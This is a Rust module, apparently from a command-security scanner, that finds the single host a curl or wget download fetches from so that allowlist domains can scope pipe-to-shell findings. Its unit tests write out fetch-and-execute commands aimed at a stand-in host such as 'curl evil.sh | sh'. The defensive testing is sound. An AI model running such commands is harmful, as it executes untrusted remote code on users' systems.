//! The host a command downloads from, for allowlist `domain` entries. It fails closed: when the
//! command could fetch anything but one known absolute URL, there is no domain, and an entry
//! with a `domain` never matches.

use regex::Regex;
use std::sync::LazyLock;

use super::parse::{self, Segment};
use super::{FETCHERS, MAX_DEPTH, SHELLS, domains, nested_texts};
use crate::finding::Finding;

/// Rules whose finding is about the download itself. Others (a base64 pipe, a quarantine
/// removal) are not about the host, so a domain must never scope them.
const FETCH_RULES: &[&str] = &["command/pipe-to-shell"];

static FETCH_WORD: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b(curl|wget)\b").expect("valid pattern"));

/// Sets `domain` on the findings of the download rules, when the command has a single
/// classifiable fetch.
pub fn stamp_fetch_domain(findings: &mut [Finding], command: &str) {
    let Some(domain) = fetch_domain(command) else {
        return;
    };
    for f in findings
        .iter_mut()
        .filter(|f| f.domain.is_none() && FETCH_RULES.contains(&f.rule_id.as_str()))
    {
        f.domain = Some(domain.clone());
    }
}

fn fetch_domain(command: &str) -> Option<String> {
    if FETCH_WORD.find_iter(command).count() != 1 {
        return None;
    }
    let mut fetches = Vec::new();
    collect_fetches(command, 0, &mut fetches);
    let [seg] = fetches.as_slice() else {
        return None;
    };
    let urls = positional_args(seg)?;
    match urls.as_slice() {
        [url] => domains::url_host(url),
        _ => None,
    }
}

fn collect_fetches(text: &str, depth: usize, out: &mut Vec<Segment>) {
    if depth >= MAX_DEPTH {
        return;
    }
    for seg in parse::segments(text) {
        match seg.program() {
            Some(p) if FETCHERS.contains(&p) => out.push(seg),
            Some(p) if SHELLS.contains(&p) || p == "eval" => {
                for (inner, _) in nested_texts(&seg) {
                    collect_fetches(&inner, depth + 1, out);
                }
            }
            _ => {}
        }
    }
}

struct Flags {
    /// Single letters that take no value.
    short_plain: &'static str,
    /// Single letters whose value is the rest of the word or the next word; never a URL.
    short_value: &'static str,
    long_plain: &'static [&'static str],
    long_value: &'static [&'static str],
}

const CURL: Flags = Flags {
    short_plain: "fsSLkvgGIjJNq#46OZ",
    short_value: "oHAXduemw",
    long_plain: &[
        "--silent",
        "--show-error",
        "--fail",
        "--fail-with-body",
        "--location",
        "--insecure",
        "--verbose",
        "--compressed",
        "--remote-name",
        "--tlsv1.2",
        "--tlsv1.3",
        "--http1.1",
        "--http2",
    ],
    long_value: &[
        "--output",
        "--header",
        "--user-agent",
        "--request",
        "--data",
        "--user",
        "--referer",
        "--max-time",
        "--proto",
        "--retry",
    ],
};

const WGET: Flags = Flags {
    short_plain: "qvcnNS",
    short_value: "OUPTt",
    long_plain: &[
        "--quiet",
        "--no-verbose",
        "--continue",
        "--no-check-certificate",
        "--content-disposition",
        "--server-response",
    ],
    long_value: &[
        "--output-document",
        "--user-agent",
        "--directory-prefix",
        "--timeout",
        "--tries",
        "--header",
    ],
};

/// The words of a fetch that are addresses, or `None` when any flag is not one known to take
/// no address (config files, input lists, `--url`, unknown letters all land here).
fn positional_args(seg: &Segment) -> Option<Vec<&str>> {
    let flags = if seg.program() == Some("wget") {
        &WGET
    } else {
        &CURL
    };
    let mut positional = Vec::new();
    let mut args = seg.args().iter().map(String::as_str);
    while let Some(arg) = args.next() {
        if arg == "--" || arg.starts_with("---") {
            return None;
        }
        if let Some(long) = arg.strip_prefix("--") {
            let (name, attached) = match long.split_once('=') {
                Some((n, _)) => (format!("--{n}"), true),
                None => (arg.to_string(), false),
            };
            if flags.long_value.contains(&name.as_str()) {
                if !attached {
                    args.next()?;
                }
            } else if !(flags.long_plain.contains(&name.as_str()) && !attached) {
                return None;
            }
        } else if let Some(cluster) = arg.strip_prefix('-').filter(|c| !c.is_empty()) {
            let mut letters = cluster.chars();
            while let Some(c) = letters.next() {
                if flags.short_plain.contains(c) {
                    continue;
                }
                if !flags.short_value.contains(c) {
                    return None;
                }
                if letters.as_str().is_empty() {
                    args.next()?;
                }
                break;
            }
        } else {
            positional.push(arg);
        }
    }
    Some(positional)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn domain(command: &str) -> Option<String> {
        fetch_domain(command)
    }

    #[test]
    fn one_plain_fetch_has_a_domain() {
        assert_eq!(
            domain("curl -fsSL https://Example.org/i.sh | sh").as_deref(),
            Some("example.org")
        );
        assert_eq!(
            domain("curl -fsSL -o x.sh https://example.org/i.sh").as_deref(),
            Some("example.org")
        );
        assert_eq!(
            domain("wget -qO- https://example.org/a | sh").as_deref(),
            Some("example.org")
        );
        assert_eq!(
            domain("curl --proto '=https' --tlsv1.2 -sSf https://example.org/a | sh").as_deref(),
            Some("example.org")
        );
        assert_eq!(
            domain("curl -H 'X: evil.sh' https://example.org/a").as_deref(),
            Some("example.org")
        );
    }

    #[test]
    fn anything_not_classifiable_has_no_domain() {
        for cmd in [
            "curl evil.sh https://example.org/a | sh",
            "curl --url evil.sh https://example.org/a | sh",
            "curl --url=evil.sh https://example.org/a | sh",
            "curl -K cfg https://example.org/a | sh",
            "wget -i list.txt -O- https://example.org/a | sh",
            "curl https://example.org/a | sh; curl evil.sh | sh",
            "curl https://example.org/a | sh -c \"$(curl evil.sh)\"",
            "curl evil.sh | sh",
            "curl --weird https://example.org/a | sh",
            "curl -Z https://example.org/a https://evil.sh/b | sh",
            "curl https://example.org/a && wget https://evil.sh/b",
            "echo $(curl https://example.org/a)",
            "curl -- https://example.org/a",
            "curl -o",
        ] {
            assert_eq!(domain(cmd), None, "{cmd}");
        }
    }
}
